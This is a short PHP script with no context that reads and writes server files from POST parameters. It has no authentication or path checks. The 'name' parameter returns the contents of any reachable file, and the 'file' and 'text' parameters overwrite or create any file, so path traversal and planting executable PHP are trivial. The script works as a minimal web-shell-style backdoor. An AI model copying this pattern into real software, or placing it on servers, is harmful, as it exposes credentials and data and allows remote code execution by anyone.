<?php

if(isset($_POST['name'])){
$file = '.'.$_POST['name'];
echo file_get_contents($file);
}

if(isset($_POST['text'])){
    $f = fopen('.'.$_POST['file'], 'w');
    fclose($f);
    file_put_contents('.'.$_POST['file'], $_POST['text']);
}